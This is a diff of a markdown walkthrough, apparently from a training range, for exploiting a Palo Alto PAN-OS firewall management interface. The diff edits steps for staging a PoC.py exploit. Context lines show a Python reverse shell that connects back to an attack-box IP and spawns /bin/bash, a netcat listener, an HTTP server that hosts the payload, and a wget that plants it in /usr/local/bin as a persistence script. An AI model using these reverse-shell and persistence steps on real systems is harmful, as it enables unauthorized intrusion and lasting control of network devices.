@@ -56,21 +56,25 @@ ssh -p 4444 localhost   # tunnel to Djibouti
 1. Create a new folder on your `attack box` called `Tools`.
    - This will stage all of the required files and scripts.
      ```bash
-     mkdir Tools
+     mkdir ~/Tools
      ```
      
-2. Open a text editor (nano) on the attack machine. `sudo nano PoC.py`
-3. Copy PoC.py from your host and paste into VM into the text editor
-   - best case of doing this is utilizing `ClickPaste`
-4. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
-5. `chmod +x PoC.py`
+2. (VM) click on a terminal and type `wget `
+4. (HOST) download `PoC.py` from the github
+5. (HOST) Go to PCTE and go to the file management section
+6. (HOST) on the page go to `upload file`
+7. (HOST) upload `PoC.py`
+8. (HOST) then click on `create a link`
+9. (HOST) `copy link`
+10. (VM) copy the link to your vm in the `commands`
+11. enter
+12. mv `weird name it gives you` Poc.py
+13. `chmod +x PoC.py`
 
 ### Persistence Script Setup
 
 1. Perform the following command: `nano pan_os_comm`
 2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
-
-
 
 
 ```python
@@ -86,10 +90,8 @@ os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
 pty.spawn("/bin/bash")
-
 ```
 
-3. Once created, run the following command: `chmod +x pan_os_comm`
 
 ### Create your netcat (Attack Box)
 ```bash
@@ -102,7 +104,7 @@ nc -lvnp 63842
    Run the below command to start the web server:
 
 ```bash
-python3 -m http.server 8080
+python3 -m http.server 80
 ```
 
 ### *Update Your `rockyou.txt` Wordlist For Later Password Cracking*
@@ -281,6 +283,7 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+
 Troubleshooting steps:
 
    1. Use the correct IP addresses and ports in your listeners and exploit arguments
@@ -311,7 +314,9 @@ ls
 2. Next, import the `pan_os_comm` script from your attack machine, where it is being hosted via the web server.
    `wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:<port>/pan_os_comm`
 
-3. To ensure that the file has been successfully downloaded and is executable, run:
+3. Once created, run the following command: `chmod +x pan_os_comm`
+
+4. To ensure that the file has been successfully downloaded and is executable, run:
 
 ```bash
 ls -l /usr/local/bin | grep pan_os
